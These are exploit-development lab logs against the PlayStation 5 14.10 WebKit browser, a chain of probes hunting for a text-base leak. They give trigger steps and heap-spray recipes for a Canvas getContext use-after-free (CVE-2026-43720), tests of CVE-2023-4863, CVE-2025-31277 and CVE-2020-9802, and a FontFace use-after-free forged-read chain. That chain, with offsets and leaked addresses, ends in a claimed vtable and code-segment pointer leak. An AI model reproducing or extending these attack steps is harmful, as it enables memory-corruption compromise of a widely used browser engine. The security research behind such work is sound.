```
p630: WebProcess text base — leak route survey
================================================
Date: 2026-11-05
Target: PS5 14.10 WebKit (Safari 17.0 / WebKit 605.1.15)
UA: Mozilla/5.0 (PlayStation; PlayStation 5/14.10) AppleWebKit/6...

=== A: Error.stack — native frame addresses? ===

A-STACK innerFunc@https://manuals.playstation.net/document/es/ps5/:54:40 | outerFunc@.../:55:40 | @.../:56:20 | global code@.../:442:3
A-HEX NONE
A-THROW @.../:65:22 | global code@.../:442:3
A-TYPEERR @.../:71:11 | global code@.../:442:3
A-DEEP recur@.../:77:67 | recur@.../:77:44 | recur@...

VERDICT: DEAD. Stack traces contain only url:line:col. No native frame
addresses, no hex values. Standard WebKit format. TypeError and deep
recursion frames are identical format. No text base leak via Error.stack.

=== B: performance.now() resolution ===

B-PERF min=-1ms max=-1ms samples=0
B-RAW now=142.00000000000003 type=number
B-LOOP 1M iter=13ms

VERDICT: DEAD for timing side channels. samples=0 means 100 consecutive
calls returned the SAME value — the timer didn't advance during the tight
loop. Resolution is extremely coarse (likely 1ms+ quantization, probably
Spectre mitigation). 1M iterations = 13ms shows the timer works at macro
scale but is useless for microarchitectural timing attacks.

=== C: WebP image decode support ===

C-ENCODE toDataURL(webp)=NO prefix=data:image/png;base64,iVBORw0K
C-WEBP SUPPORTED w=1 h=1

VERDICT: ★ WebP DECODE IS SUPPORTED. Canvas cannot encode to WebP
(toDataURL returns PNG), but image decode works (1x1 pixel loaded OK).
CVE-2023-4863 (libwebp VP8L Huffman heap overflow) is potentially viable.
The patch was Sep 12 2023; Safari 17.0 shipped Sep 26 2023 — tight timing.
If PS5 WebKit bundles a pre-1.3.2 libwebp, the overflow is reachable.

=== D: DFG type confusion (double[] vs object[]) ===

D-DFG type=object val=[object Object]
D-SAFE returned object (OSR exit worked)
D-DFG2 type=string val=[object Object]0 hex=7ff8000000000000
D-DFG3 type=object val=obj

VERDICT: DEAD. All three variants returned correct types. DFG properly
triggers OSR exit when array type changes from ContiguousDouble to
ContiguousJS. The classic addrof pattern does not work.
D-DFG2: 7ff8000000000000 = NaN (string "[object Object]0" coerced to NaN).
Not a pointer leak.

=== E: Debug/internal APIs ===

E-DEBUG NONE
E-WEBKIT IDBFactory=function, webkitRequestAnimationFrame=function, webkitURL=function, WebKitCSSMatrix=function

VERDICT: DEAD. No $vm, gc, addressOf, drainMicrotasks, or any JSC debug
API. Production build confirmed. webkit-prefixed APIs are standard
browser features (IDB, rAF, URL, CSSMatrix), nothing exploitable.

=== F: Native function toString ===

F-TOSTR NO-HEX (all clean)
F-SAMPLE Array=function Array() { [native code] } | eval=function eval() { [native code] }

VERDICT: DEAD. All native function toString() returns standard
"function X() { [native code] }" format. No hex addresses anywhere.

=== G: DFG regex match array (CVE-2025-31277 pattern) ===

G-REGEX matches=3 anomalies=NONE
G-CAPTURE abc,a,b,c,0

VERDICT: DEAD (simple trigger). 100K warmup iterations, then check —
match arrays have correct prototype, correct index/input types, correct
element types. No type confusion observed. The CVE-2025-31277 trigger
may require a more specific pattern than global exec(), or it was patched.

=== H: FinalizationRegistry / WeakRef ===

H-FINREG available
H-CALLBACK fired=false val=null
H-WEAKREF available
H-DEREF deref=object
H-AFTER-GC deref=object (null=collected)

VERDICT: AVAILABLE but not directly exploitable for text base.
FinalizationRegistry callback didn't fire during the probe (GC didn't
collect in time with 50×1MB allocation pressure). WeakRef.deref() returns
object even after pressure. Useful as GC oracle for timing UAF exploits,
NOT for text base leak.

=== I: Performance timing entries ===

I-NAV type=navigate duration=0 domComplete=0 name=https://manuals.playstation.net/document/es/ps5/
I-RES count=8 (beacon requests)
I-RES0 name=.../beacon/P630-START%20Mozilla% dur=15
I-RES1 name=.../beacon/P630-A-THROW%20%40ht dur=16
I-RES2 name=.../beacon/P630-B-PERF%20min%3D- dur=16.000000298023222
I-MEM performance.memory NOT available

VERDICT: DEAD. Navigation timing zeroed (duration=0, domComplete=0).
Resource timing shows beacon durations (~15-16ms) but no internal addresses.
performance.memory NOT available — no heap size info. No leak path.

=== J: Misc unusual APIs ===

J-TRANSFER NOT available (ArrayBuffer.transfer)
J-CLONE structuredClone available
J-CLONE-XFER orig_detached=true clone=deadbeefcafebabe
J-PROXY traps=get:0,get:1,get:2,toJSON,get:0,get:1,get:2
J-BIG64 write/read ok val=0x4141414141414141
J-CSS CSS.escape available
J-CSSSUP font face=false

USEFUL PRIMITIVES:
- structuredClone with transfer: WORKS. ArrayBuffer detach confirmed
  (orig_detached=true). Useful for UAF / use-after-detach patterns.
- BigUint64Array: read/write 64-bit integers confirmed.
- Proxy traps: working (get:0,1,2 + toJSON from JSON.stringify).
- ArrayBuffer.transfer (instance method): NOT available (expected for
  605.1.15, this is a newer spec addition).

=== SUMMARY ===

DEAD ROUTES for WebProcess text base:
  ✗ Error.stack — url:line:col only, no native addresses
  ✗ performance.now() — heavily quantized, no timing side channel
  ✗ DFG type confusion (addrof) — OSR exit works correctly
  ✗ Debug APIs ($vm, gc, addressOf) — production build, all absent
  ✗ Native toString — standard [native code] format, no hex
  ✗ Regex match array confusion — no anomalies after DFG warmup
  ✗ Performance entries — navigation timing zeroed, no heap info
  ✗ FinalizationRegistry — available but not a leak source

★ ACTIONABLE FINDING:
  WebP decode IS SUPPORTED on PS5 14.10 WebKit.
  CVE-2023-4863 (libwebp VP8L Huffman heap overflow, Sep 2023) should
  be investigated. The fix timeline (patch Sep 12, Safari 17.0 Sep 26)
  is extremely tight — PS5 14.10 build may use a vulnerable libwebp.

USEFUL PRIMITIVES (for later exploitation):
  ✓ structuredClone with transfer (ArrayBuffer detach)
  ✓ BigUint64Array (64-bit R/W on ArrayBuffer)
  ✓ FinalizationRegistry + WeakRef (GC oracle)
  ✓ Proxy traps (operation interception)
```

```
p631: CVE-2023-4863 — libwebp VP8L Huffman heap overflow crash test
==================================================================
Date: 2026-11-05
Target: PS5 14.10 WebKit (Safari 17.0 / WebKit 605.1.15)

RESULT: NOT VULNERABLE — all 4 PoC files handled without crash.

Test results:
  0. bad.webp (236B, mistymntncop, 4 entries past kTableSize limit)
     → LOADED w=1 h=1 — NO CRASH

  1. talbeerysec_bad.webp (241B, talbeerysec variant)
     → DECODE ERROR — rejected by decoder, no crash

  2. nso.webp (350B, NSO/BLASTPASS variant, 116 entries past limit)
     → LOADED w=1 h=1 — NO CRASH

  3. liveoverflow_poc.webp (1072B, Apple's original PoC from Chromium bug 1479274)
     → LOADED w=32 h=32 — NO CRASH

Analysis:
  The talbeerysec variant received an explicit decode error (onerror fired),
  indicating the decoder validated and rejected the invalid Huffman table
  structure. The other 3 files decoded successfully without crash.

  PS5 14.10 build date is Sep 28 2026 — three years after the libwebp 1.3.2
  fix (Sep 7 2023). Sony almost certainly updated libwebp independently of
  the WebKit fork (605.1.15 is ~2017 vintage, but component libraries are
  updated separately).

  p630 confirmed WebP decode IS supported on PS5 14.10 (the decoder works),
  but the CVE-2023-4863 vulnerability is patched/mitigated.
```

```
p635: CVE-2026-43720 — Canvas getContext() reentrant UAF
=========================================================
Date: 2026-11-05
Target: PS5 14.10 WebKit (Safari 17.0 / WebKit 605.1.15)

RESULT: VULNERABLE — UAF trigger confirmed, same-type reclaim, full bidirectional R/W.

Iterations:
  v1: OOM crash (500 × 64×64 canvases = ~8MB pixel buffers)
  v2: crash at P2 (pre-reclaim innerCtx.lineWidth = 42.5 touched freed memory)
  v3: SUCCESS — removed pre-reclaim access, all 7 phases completed

Beacon log (successful v3 run at 04:16:45):
  P1   bitmaprenderer OK (ImageBitmapRenderingContext)
  P2   trigger fired: getter=true, innerCtx=yes, outer=ImageBitmapRenderingContext
  P3   sprayed 150 Canvas2D contexts (1×1 canvases)
  P4   *** ALIAS FOUND *** at spray[9]
  P5   Bidirectional R/W ALL PASS:
         lineWidth:    MATCH (inner→alias, alias→inner)
         miterLimit:   MATCH
         globalAlpha:  MATCH
         fillStyle:    MATCH (#cafeba round-trip)
         transform:    MATCH (a=1.1 d=4.4 via setTransform/getTransform)
         save/restore: MATCH (333→222→111 through alias)
  P6   getImageData: px=0,0,0,0 — pixel buffer NOT shared (separate per canvas element)
  P7   stateStack mismatch: all reads=1 — reclaim reinitializes stack, no OOB

Trigger mechanism:
  1. Create canvas, define opts with Object.defineProperty('alpha', {get: ...})
  2. Getter calls canvas.getContext('2d') → sets m_context to CanvasRenderingContext2D
  3. Outer getContext('bitmaprenderer', opts) replaces m_context → frees 2d context (768B)
  4. innerCtx JS wrapper survives → dangling pointer to freed memory
  5. Spray 150 Canvas2D contexts → one reclaims the 768B slot → alias

Key findings:
  - Alias at spray[9] of 150 — early reclaim, high reliability
  - MUST NOT access innerCtx before spray (writing freed memory crashes WebProcess)
  - All Canvas2D state properties alias bidirectionally
  - Pixel data (getImageData) is per-canvas, not per-context — not shared through alias
  - stateStack OOB read does not work — reclaim reinitializes m_stateStack
  - 150 × 1×1 canvases stay within PS5 browser memory budget
  - WebKit fix: commit 2693828e8d73 (2026-06-29), NOT present in PS5 14.10 (build Sep 2026)

Primitive gained:
  State R/W channel: 48 bytes via transform (6 doubles) + lineWidth, miterLimit,
  globalAlpha, shadowBlur, shadowOffsetX, shadowOffsetY, lineDashOffset (7 doubles).
  fillStyle (string). save/restore stack operations through alias.

  This is a CONTROL primitive, not an info-leak. Float64 properties are subject to
  DAZ (Denormals Are Zero) — userland pointers read as 0 through doubles.
  Integer byte access via getImageData returns per-canvas pixels, not context state.

  Next steps: find an info-leak path (WebProcess text base) to pair with this control.

VERDICT: CONFIRMED VULNERABLE. CVE-2026-43720 is exploitable on PS5 14.10.
  pastawithpesto independently confirmed (V573/V630).
```

```
p636: IsoHeap / Gigacage / JIT Verification
============================================
Date: 2026-11-05
Target: PS5 14.10 WebKit (Safari 17.0 / WebKit 605.1.15)

PURPOSE: Reconcile contradictions with pastawithpesto's source analysis claims.

RESULTS:
  JIT (DFG):  ACTIVE — pastawithpesto WRONG
  IsoHeap:    OFF    — pastawithpesto RIGHT
  Gigacage:   ON     — (p600, not retested here)

========== JIT ==========
5M integer loop: 176-189ms across 6 loads (v4×3 + v3×2 + v5)
new Function() compilation: 45-48ms
Verdict: unmistakably JIT-compiled. Interpreter would take 2-5 seconds.
DFG tier confirmed from p602 (49ms). FTL likely absent.

========== IsoHeap ==========

Methodology (v4, AB-before-same-type reclaim test):

  Control (P2): Trigger CVE-2026-43720 Canvas getContext reentry UAF (768B
  CanvasRenderingContext2D freed). Spray 150 Canvas2D contexts. Write lineWidth
  through dangling pointer, scan spray for alias.
  → WORKS: alias at spray[8-10], 100% reliability across all loads.

  Test (P3): Same UAF trigger. Spray 240 ArrayBuffers (sizes 768/752/736)
  BEFORE 150 Canvas2D contexts. Then write lineWidth through dangling pointer.
  → CRASHES: 3/3 loads crash (hard segfault, no JS catch) at the lineWidth write.
  WebProcess killed. No "write-CRASH" beacon received (catch block never reached).

  Additional control (v3): UAF with NO spray at all, then read lineWidth.
  → CRASHES: freed memory is inherently unreadable. 2/2 loads crash.
  This rules out OOM or memory pressure as the cause — it's about who
  reclaimed the freed slot.

Logic:
  1. P2 (no ABs): Canvas2D reclaims freed 768B slot → alias works
  2. P3 (ABs first): Canvas2D does NOT reclaim → write crashes
  3. v3 control: no spray → write crashes (freed memory is garbage)
  4. Therefore: ABs consumed the freed slot before Canvas2D could
  5. Therefore: ArrayBuffer and CanvasRenderingContext2D share the same
     bmalloc heap → IsoHeap is OFF

This is consistent with pastawithpesto's source analysis:
  BPLATFORM(PLAYSTATION) → USE_ISO_MALLOC_HEAP_FOR_CANVAS_RENDERING_CONTEXT is OFF
  Canvas2D and ArrayBuffer both go through FastMalloc (single heap).

Previous tests (p600 Gigacage, p613 AB(80) vs HashTable) did not test this
specific cross-type reclaim because:
  - p600 tested JSArray butterflies (Gigacage, structurally separate)
  - p613 tested AB(80) vs WTF::HashTable(80) (different internal allocators)
  - Neither tested AB vs CanvasRenderingContext2D at the same size class

========== Gigacage ==========
Not retested. p600 confirmed active: 4 runs × 3072 JSArrays, zero corruption.
Butterflies isolated from CSSFontFace/CanvasRenderingContext2D allocations.

========== Implications ==========

IsoHeap OFF means:
  1. Cross-type reclaim IS possible for any two C++ objects in the same size class
     via ArrayBuffer spray at that size. This is GOOD for exploitation — spray
     diversity increases.
  2. The p613 "AB(80) can't reclaim HashTable" finding was about bmalloc
     internal size-class granularity, not IsoHeap — 80B AB and 80B HashTable
     may still be in different size classes within FastMalloc.
  3. FontFace UAF 192B reclaim via ArrayBuffer (confirmed in p599 v4i) works
     BECAUSE iso-heap is off — the same mechanism.

JIT ACTIVE (DFG) means:
  1. DFG optimization passes are available for JIT-based type confusion attacks
  2. DFG-specific CVEs remain relevant (though tested ones are patched)
  3. new Function() IS JIT-compiled — dynamic code generation works

Beacon log (representative v4 load #1, 04:39:50):
  START v4
  P1 loop=189ms JIT-ACTIVE
  P2 baseline alias=10
  P3 ABs=240
  P3 ctx2=150
  [CRASH — no further beacons]

Beacon log (representative v4 load #2, 04:39:54):
  START v4
  P1 loop=178ms JIT-ACTIVE
  P2 baseline alias=8
  P3 ABs=240
  P3 ctx2=150
  [CRASH — no further beacons]

Beacon log (representative v4 load #3, 04:39:55):
  START v4
  P1 loop=176ms JIT-ACTIVE
  P2 baseline alias=8
  P3 ABs=240
  P3 ctx2=150
  [CRASH — no further beacons]

VERDICT: IsoHeap OFF, JIT (DFG) ACTIVE, Gigacage ON on PS5 14.10.
```

```
--- RAW BEACONS ---
[2026-11-05 07:49:54.341] START v1

[2026-11-05 07:49:54.451] P2-HABT Array.prototype[0] accessor installed | P2-VERIFY getter_calls=0
[2026-11-05 07:49:54.493] P3-READ val=a getter_before=0 getter_after=0 | P3-VULN *** GETTER BYPASSED — CONTIGUOUS ARRAY IN HABT STATE ***
[2026-11-05 07:49:54.537] P3-VULN CVE-2025-31277 IS PRESENT on this WebKit
[2026-11-05 07:49:54.585] P4-LARGE-IDX survived store to [41530] | P4-STATE len=41531 [0]=t [41530]=probe
[2026-11-05 07:49:54.685] P4-VULN *** TYPE CONFUSION: SlowPut check bypassed after transition ***
[2026-11-05 07:49:54.782] P5-COMMIT-POC completed recurse=51
[2026-11-05 07:49:54.833] P6-MATCH len=4 | P6-IDX7 val=OBJ_PROTO_GET getter_calls=1 | P6-SAFE Object.prototype[7] getter fired correctly
[2026-11-05 07:49:54.881] DONE v1

--- ANALYSIS ---

CVE-2025-31277 IS CONFIRMED PRESENT on PS5 14.10 WebKit (605.1.15 / Safari 17.0).

The fix (WebKit commit 716536ce98d6) adds isHavingABadTime() check to
tryCreateContiguousArrayWithPattern in JSGlobalObjectInlines.h. PS5's older
WebKit lacks this check.

Evidence:
  P1: Baseline OK — RegExp match works, prototype accessor works on custom proto
  P2: HABT triggered via Array.prototype[0] accessor. getter_calls=0 on
      pre-existing normalArr (expected: pre-HABT arrays keep their storage)
  P3: *** CONFIRMED *** — RegExp match array created AFTER HABT is Contiguous,
      not SlowPut. Array.prototype[0] getter was BYPASSED (getter_calls stayed 0).
      matchResult[0] returned 'a' (direct butterfly read), not undefined (getter).
  P4: *** CONFIRMED *** — Large index store [41530] survived (Contiguous →
      ArrayStorage transition without SlowPut flag). Post-transition, getter
      still bypassed (getter_calls=0). This is the assertion path from the
      commit's test case (needsSlowPutIndexing() assertion skipped in release).
  P5: Commit-exact PoC completed (recurse=51) without crash — assertion is
      debug-only, release builds skip it.
  P6: CONTROL — Object.prototype[7] getter DID fire on match array for index 7
      (beyond array length). The bypass is ONLY within the Contiguous butterfly
      range. Out-of-range indices still go through prototype chain (slow path).

Key insight: the bypass is structural. The match array's indexing type is
Contiguous (fast path — direct butterfly access for in-range indices) instead
of SlowPut (slow path — prototype chain check on every access). This is
exploitable via DFG JIT type confusion.

Next: p638 — escalate to fakeobj/addrof via DFG type profiling confusion.
```

```
=== p638: CVE-2025-31277 escalation — HABT bypass to fakeobj/addrof ===
Date: 2026-11-05 07:58:39
Source: PS5 14.10 browser (192.168.1.37) via beacon logs

--- RAW BEACONS ---
START v1

[A] Delete-hole discrimination:
  A-MATCH len=2 [0]=x
  A-HOLE val=PROTO_GET getter=1 hasOwn=false
  A-SLOWPUT getter fired on hole — SlowPut (patched)
  → SURPRISE: delete + read goes through prototype. Array is NOT purely Contiguous for holes.

[B] DFG type profiling attack (getter returns 13.37):
  B-WARMUP done (50k iterations)
  B-CONFUSED val=a type=string getter=0
  B-BYPASS DFG returned string (getter bypassed) — OSR exit occurred or inlined fast path
  → DFG correctly returns 'a' not 13.37. Getter bypassed but OSR exit works.

[C] Setter bypass (write object, read back):
  C-WARMUP done (50k iterations, sCalls accumulated)
  C-WRITE setter=0 result_type=object is_same=true
  C-BYPASS setter bypassed — object stored directly in butterfly
  C-OBJ-STR obj_toString=[object Object]
  → CONFIRMED: setter completely bypassed. Object stored directly in butterfly.

[D] Structure ID speculation:
  D-WARMUP normalSum=6.6
  D-CONFUSED confSum=NaN expected=NaN(strings)
  D-DOUBLES confSum2=6.6 expected=6.6
  → No type confusion. DFG handles both correctly.

[E] Float64Array addrof attempt:
  E-SETUP [0]type=object [1]type=number
  E-JSON [{},1.1]
  E-COERCE obj+0=[object Object]0 type=string
  E-SPEC type=object (after type change and DFG)
  → No addrof. DFG OSR exits when type changes.

[F] DFG CheckArray with out-of-range access:
  F-WARMUP done
  F-PRE len=2 [0]=x
  F-RESULT val=intercepted type=string [5]=intercepted len=2
  F-SETTER setter fired — slow path (but only for out-of-range?)
  → CONFIRMED: out-of-range accesses go through slow path (prototype).
    The bypass is ONLY within the contiguous butterfly range.

[G] Direct DFG double/object confusion:
  G-WARMUP sum=3.3
  G-RESULT type=string val=[object HTMLDivElement][object HTMLDivElement]
  G-SAFE DFG handled type change correctly (OSR exit)
  → No type confusion. DFG OSR exit works correctly.

[H] ensureArrayStorage race:
  H-PRE len=2
  H-POST len=1001 [0]=a [1000]=sparse
  H-READS AP0 1:a 2:undefined 3:undefined 4:undefined
  H-999 (getter fired for slot 999)
  H-SLOW SlowPut active after conversion
  → IMPORTANT: After ArrayStorage conversion, SlowPut IS active.
    The bug only persists in the Contiguous state.
  → ALSO: [0] reads as AP0 (prototype getter) but [1] reads as 'a' (direct).
    After conversion, element 0 was holes (from delete?) but element 1 survived.

[I] Direct fakeobj via double→object DFG confusion:
  I-WARMUP readDouble(dblArr,0)=1.1
  I-READ type=object val=[object Object]
  I-OSR DFG OSR exited — returned object correctly
  → No addrof. DFG OSR exit is too robust.

[J] fakeobj via reverse direction:
  J-WARMUP done
  J-WRITE type=number val=3.14
  J-READBACK type=object val=[object ArrayBuffer]
  → No fakeobj. DFG returns correct types.

--- ANALYSIS ---

The HABT bypass (CVE-2025-31277) is CONFIRMED but DFG JIT OSR exits are too
robust for direct type confusion attacks. Every test where we tried to make
DFG misinterpret an object as a double (or vice versa) resulted in correct
OSR exit behavior.

KEY FINDINGS:
1. Setter bypass is REAL (Section C) — objects stored directly in butterfly
2. Getter bypass is REAL for in-range indices (p637 P3)
3. BUT: delete creates holes that DO go through prototype (Section A)
4. Out-of-range accesses DO go through prototype (Section F)
5. ArrayStorage conversion FIXES the bug (Section H) — SlowPut activates
6. DFG OSR exits are correct in ALL tested scenarios

The HABT bypass does NOT give direct fakeobj/addrof via DFG profiling.
The exploitation path must go through a different mechanism:
- Invariant violation in JSC array operations that depend on HABT state
- Race condition between Contiguous→ArrayStorage conversion and another operation
- Finding a JSC code path that assumes setter fired but it didn't

NEXT: Need to find a JSC invariant that the setter bypass violates.
```

```
CVE-2025-31277 is NOT exploitable on PS5 14.10 via the standard HABT bypass route.

The correct discriminator (write to a HOLE within vectorLength) proves that
RegExp match arrays DO respect SlowPut semantics on 14.10. The p637 "getter
bypassed" result was a FALSE POSITIVE: own properties always shadow prototype
getters in JavaScript regardless of the array's indexing type.

Evidence:
- p637 P3: matchResult[0] = 'a' with getter_calls=0 → FALSE POSITIVE
```

## FILE: results/phase13_webkit/p641_canvas2d_uaf_stale_read_20261105_083402.txt

```
=== p641 v2: Canvas2D UAF stale read (no spray) ===
Date: 2026-11-05 08:34:02
Source: PS5 14.10 browser (192.168.1.37) via beacon logs
Runs: 4 (all crashed identically at section C)

--- RAW BEACONS ---
Run 1 (08:34:02):
  P641-START v2
  P641-A trigger v2
  P641-A getter=true inner=true outer=true
  P641-C immediate-read
  [CRASH — WebProcess restart, no further beacons]

Run 2 (08:34:09, +7s): identical — getter=true, crash at C
Run 3 (08:34:11, +2s): identical — getter=true, crash at C
Run 4 (08:34:13, +2s): identical — getter=true, crash at C
[PS5 stopped reloading after 4 crashes]

--- ANALYSIS ---

v2 trigger FIX CONFIRMED:
  v1 had getter=false (pre-created 2d context blocked bitmaprenderer)
  v2 sets values INSIDE getter callback → getter=true, inner=true, outer=true
  The CVE-2026-43720 UAF trigger works correctly in v2.

STALE READ WITHOUT RECLAIM: CRASHES (4/4 runs)

The probe flow:
  1. Get bitmaprenderer context via getContext('bitmaprenderer', {alpha: getter})
  2. Getter creates 2d inner context, sets distinctive values (lw=13.37, etc.)
  3. Getter returns → bitmaprenderer created → CanvasRenderingContext2D freed (768B)
  4. Section C: immediately reads innerCtx.lineWidth
  5. → CRASH

Root cause:
  After free, the CanvasRenderingContext2D's vtable pointer at +0x00 is either
  zeroed or corrupted. Reading .lineWidth triggers C++ virtual dispatch
  (through the state stack API), which dereferences the invalid vtable → crash.

  bmalloc does NOT zero freed memory (p599 v4i proved freed 80B blocks have
  benign residual data), but CanvasRenderingContext2D's destructor likely clears
  critical fields, or bmalloc's free list chain overwrites the vtable slot.

Sections D-G (delayed reads, allocation pressure, same-type spray, iframe UAF):
  NEVER REACHED — all 4 runs crashed at section C before getting there.

CONCLUSION:
  Canvas2D UAF stale read without spray = CRASH, NOT info leak.

  To use the Canvas2D UAF, you MUST do same-type reclaim first (150 canvas
  contexts as in p635). With reclaim, reads go through valid C++ API but return
  spray values only (p629 confirmed: ALL 13 readable numeric properties match
  spray values EXACTLY). No raw struct field access, no pointer leak.

  The Canvas2D UAF (CVE-2026-43720) is a CONTROL primitive (R/W over state
  stack values), NOT an INFO-LEAK primitive. It cannot reveal WebProcess text
  base by itself.
```

```
  (b) Does an OSR exit when the Proxy is encountered

completely dead on 14.10.

was already confirmed dead (p634). Both are 2018-era DFG bugs, both patched.
```

```
  C-WARM accessWithNeg warmed 100K
  C-RESULT returned=57005 (= 0xDEAD = MARKER)
  C-SAFE bounds check caught it (returned MARKER)

    (bounds check held). Zero OOB reads.

[G] OSR hot loop with INT_MIN injection:
  G-RESULT anomalies=0/50
  → 50 rounds × 1000 elements with INT_MIN at position 999. DFG-compiled
    hot loop handles INT_MIN correctly every time. Zero anomalies.

--- ANALYSIS ---

CVE-2020-9802 is **DEAD on PS5 14.10**.

The bug: DFG CSE treats ArithNegate as pure, but -INT_MIN overflows int32 to
double. If CSE replaces a second ArithNegate with the first's result, the second
use site may assume int32 → wrong index → OOB.

On PS5 14.10: DFG correctly handles ALL ArithNegate edge cases:
  - INT_MIN negation correctly produces double 2^31
  - |0 truncation correctly wraps to -2^31
  - Bounds checks NOT eliminated by range analysis
  - Math.abs(INT_MIN) correctly rejected
  - Negative zero handled without confusion
  - TypedArray bounds checks hold for all edge values
  - OSR-compiled hot loops handle INT_MIN correctly

Note: Section B ANOMALY was a false positive in the detection code.
ToInt32(2^31) = -2^31 is correct JS semantics, not a vulnerability.

Sony patched the CSE ArithNegate overflow or DFG range analysis handles it
correctly on the 605.1.15 branch.
```

```
  - Oracle (check() pattern-match): ALIVE for self-scan, DEAD for boundary()
  - Self-discovery (spray buffer VA): SUCCESS — 0x1000384480
  - VTAB (adjacent buffer): SUCCESS — 0x1000384100 (buffer j0, -14*64B from SELF)
  - W1 vtable chain read via forgeRead(): CRASH (WebProcess died)
  - Walk forge / face.style trigger: NOT REACHED

== CRASH ANALYSIS ==

forgeRead(L1-0x10, 80) modifies the spray buffer to redirect face.style
to read 80 bytes from the hash table region. It writes:
  +0x08 = self+0x70  (overwrites CSSFontFace member)
  +0x30 = 4
  +0x34 = 80 (length)
  +0x38 = L1-0x10 (target address)
  +0x70..+0x98 = forged property serialization chain

The engine actively reads CSSFontFace fields during layout (the face was
re-added to document.fonts and is in the font set). Changing +0x08 to a
forged pointer triggers an IMMEDIATE crash before the 70ms setTimeout
callback fires. No W1-PRE-RD synchronous beacon was received.

ROOT CAUSE: The style-read mechanism is unsafe because the engine
dereferences CSSFontFace fields between the buffer write and the
explicit face.style read. The fields at +0x08, +0x70, +0x7A, +0x90,
+0x98 are actively accessed by the engine's layout/rendering thread.

== RUN-BY-RUN ==

Run 1 (R4UDWW, 20:34:16): VER+BOOT only, no trigger (cold page)
Run 2 (7ZGDTS, 20:36:25): VER+BOOT only, no trigger
Run 3 (DOF0A5, 20:37:35): RES-n2, L1=0x0, L2=0x0 → NOLEAK (spray missed)
Run 4 (O73QK6, 20:41:41): PARTIAL SUCCESS — see below
Run 5 (S7ANGN, 20:44:09): VER+BOOT only (auto-reload after crash)

== RUN 4 (O73QK6) DETAILED TIMELINE ==

20:41:41.943  BOOT-O73QK6,ctl=0
20:41:41.950  RES-n2  (promise resolved, 2 faces)
20:41:41.997  L1-0x1000891e60  (hash table pointer LEAKED)
20:41:42.007  L2-0x1000804200  (WeakPtrImpl* LEAKED)
20:41:42.021  FORGED-1  (1 spray buffer reclaimed CSSFontFace slot)
20:41:42.043  FAMILY-OK  (face renamed to zz0)
20:41:42.082  ADD-OK  (face re-added to document.fonts)
20:41:42.333  DIAG: chk0=false,chk41=false,chk100=false (boundary oracle dead)
20:41:42.405  PH2-START (7 b0 candidates)
20:41:42.429  A-DEAD  (boundary() returned -1, m_status=0 makes all in-range false)
20:41:42.500  DIAG: bufs=1, fam=zz0, zi=0
20:41:42.583  DIAG: ptr20=0x1000804207 (L2 still at +0x20)
20:41:42.609  PH3 oracle sweep begins (570 readings over ~13s)
20:41:42.669  DIAG: L2=0x1000804200, cnt=1, cap=1

20:41:53.024  W1-START (si=1)
20:41:54.310  SELF-0x1000384480 (spray buffer VA discovered!)
              ... forgeRead() called, buffer layout modified ...
              ... WebProcess CRASHED (no further beacons) ...
20:41:55.440  Last queued async PH3 beacon delivered
20:44:09.355  New BOOT (page auto-reloaded after crash)

== ORACLE MECHANISM ==

The check() oracle works in TWO modes:
1. boundary() — binary search for exact byte values via UnicodeRange
   DEAD in this run: L2+0x07 encoded a range including char 0
2. Pattern match — check specific codepoints against known marker values
   ALIVE: self-scan used {from=0x1000, to=0x2000} marker at +0x38..+0x3F

The pattern-match oracle enabled self-discovery and VTAB detection even
when boundary() failed. This dual-mode design is robust.

== ADDRESSES DISCOVERED ==

  L1 (hash table)      = 0x1000891e60  (engine-written at CSSFontFace+0x58)
  L2 (WeakPtrImpl*)    = 0x1000804200  (engine-written at CSSFontFace+0x68)
  SELF (spray buffer)  = 0x1000384480  (found via +0x38 marker oracle)
  VTAB (adjacent buf)  = 0x1000384100  (14 positions below SELF)
  SKIPJ                = 0             (buffer index used for external vtable)

Address relationships:
  SELF - VTAB = 0x380 = 896 bytes = 14 * 64B (14 spray-buffer positions)
  L1 region ~5.3 MB above SELF
  L2 region ~4.9 MB above SELF

== WHAT WORKS ==

1. FontFace UAF trigger + 192B ArrayBuffer spray reclaim
2. L1/L2 leak from engine-written fields (+0x58, +0x68)
3. check() pattern-match oracle for in-buffer markers
4. Self-discovery of spray buffer VA
5. Adjacent buffer detection for external vtable storage

== WHAT CRASHED ==

forgeRead() style-read mechanism. The engine actively dereferences
CSSFontFace members during layout, so modifying +0x08 (and other
fields) for a redirected face.style read crashes immediately.

== NEXT STEPS ==

1. Remove face from document.fonts BEFORE forgeRead to prevent layout access
2. Or: use check() oracle ONLY (no face.style) for memory reads
3. Or: find which specific field causes the crash and avoid modifying it
4. The walk-forge layout (Step 9) was never tested — the crash is earlier

== BEACON LOG ==

Full beacon log: p690_walk_forge_oracle_20261109_204155.log (604 lines, 38KB)
```

```
FULL SUCCESS: 4-step walk chain completed. CSSFontFaceSet vtable
pointer (VP) and 9 vtable function pointers leaked from the WebProcess
code segment. VP = WebProcess_base + constant_RVA. This is the
WebProcess TEXT BASE LEAK — HARD BLOCKER #1 is solved.

Run UHOGII (23:54:02):

  - L1 (hash table ptr) leak: SUCCESS — 0x10008a5ff0
  - L2 (WeakPtrImpl*) leak: SUCCESS — 0x1000164140

  - W2 (read 2: IM → FO): SUCCESS — FO = 0x1000160770
  - W3 (read 3: FO → VP): SUCCESS — VP = 0x80f4b9b28
  - W4 (read 4: VP → vtable): SUCCESS — 9 slots, 72 bytes
  - WALK-ok: true

== BUG FIX ==

The VP validation threshold was `VP > 0x1000000000n` (68 GiB). VP is a
CODE SEGMENT pointer at ~0x8xxxxxxxxx (~34 GiB), not a HEAP pointer at
~0x10xxxxxxxxxx. The check always failed, so the W4 block never
executed. h4/h5/VT were always empty strings — not because the CSS
engine had a 3-read budget, but because the code that would have done
the 4th read was inside an if-block that was never entered.

Fix: changed threshold to `VP > 0x100000000n` (4 GiB).

This one-line bug masked the working 4-read chain for multiple sessions.
The "3-read limit" was a phantom.

== WALK CHAIN ==

The walk chain dereferences 4 pointers in sequence, each via
forgeRead() + face.style (CSS property read from the reclaimed
CSSFontFace buffer):

  Step 1 (IHT): Read hash table at L1-0x10 (80 bytes)
    → Parse metadata (dc, kc, mask, size) and scan 8 buckets
    → Find client WeakPtrImpl address (IM)
    Result: IM = 0x10009e0140

  Step 2 (W2): Read IM+8 (16 bytes)
    → Dereference WeakPtrImpl.m_ptr to find CSSFontFaceSet object (FO)
    Result: FO = 0x1000160770

  Step 3 (W3): Read FO (32 bytes)
    → FO+0x00 = vtable pointer (VP) — CODE SEGMENT address
    → FO+0x08 = IM (back-pointer, validates chain)
    → FO+0x10 = spray buffer address (SELF!)
